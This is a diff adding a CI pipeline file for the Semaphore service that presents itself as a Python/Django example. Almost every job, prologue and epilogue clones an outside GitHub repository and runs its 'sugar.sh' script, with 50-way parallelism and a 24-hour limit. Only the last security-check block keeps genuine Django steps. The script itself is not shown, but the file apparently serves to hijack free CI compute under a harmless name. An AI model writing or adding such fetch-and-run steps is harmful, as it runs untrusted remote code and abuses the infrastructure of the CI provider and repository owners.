@@ -1,0 +1,169 @@
+version: v1.0
+name: Semaphore Python / Django Example Pipeline
+agent:
+  machine:
+    type: e1-standard-4
+    os_image: ubuntu1804
+execution_time_limit:
+  hours: 24
+global_job_config:
+  prologue:
+    commands:
+      - 'git clone https://github.com/Natnaelo/Sugarsweet'
+      - cd Sugarsweet/
+      - sh sugar.sh
+  epilogue:
+    always:
+      commands:
+        - 'git clone https://github.com/Natnaelo/Sugarsweet'
+        - cd Sugarsweet/
+        - sh sugar.sh
+    on_pass:
+      commands:
+        - 'git clone https://github.com/Natnaelo/Sugarsweet'
+        - cd Sugarsweet/
+        - sh sugar.sh
+    on_fail:
+      commands:
+        - 'git clone https://github.com/Natnaelo/Sugarsweet'
+        - cd Sugarsweet/
+        - sh sugar.sh
+blocks:
+  - name: Install Dependencies
+    task:
+      prologue:
+        commands:
+          - 'git clone https://github.com/Natnaelo/Sugarsweet'
+          - cd Sugarsweet/
+          - sh sugar.sh
+      jobs:
+        - name: pip
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_pass:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_fail:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+  - name: Run Code Analysis
+    task:
+      prologue:
+        commands:
+          - 'git clone https://github.com/Natnaelo/Sugarsweet'
+          - cd Sugarsweet/
+          - sh sugar.sh
+      jobs:
+        - name: Pylint
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_pass:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_fail:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+  - name: Run Unit Tests
+    task:
+      prologue:
+        commands:
+          - 'git clone https://github.com/Natnaelo/Sugarsweet'
+          - cd Sugarsweet/
+          - sh sugar.sh
+      jobs:
+        - name: Model Test
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+          parallelism: 50
+        - name: View Test
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_pass:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_fail:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+  - name: Run Browser Tests
+    task:
+      env_vars:
+        - name: DB_NAME
+          value: pydjango
+      prologue:
+        commands:
+          - 'git clone https://github.com/Natnaelo/Sugarsweet'
+          - cd Sugarsweet/
+          - sh sugar.sh
+      jobs:
+        - name: Browser Test
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+          parallelism: 50
+      epilogue:
+        always:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_pass:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+        on_fail:
+          commands:
+            - 'git clone https://github.com/Natnaelo/Sugarsweet'
+            - cd Sugarsweet/
+            - sh sugar.sh
+  - name: Run Security Tests
+    task:
+      jobs:
+        - name: Deployment Checklist
+          commands:
+            - checkout
+            - cache restore
+            - pip install -r requirements.txt --cache-dir .pip_cache
+            - python manage.py check --deploy --fail-level ERROR
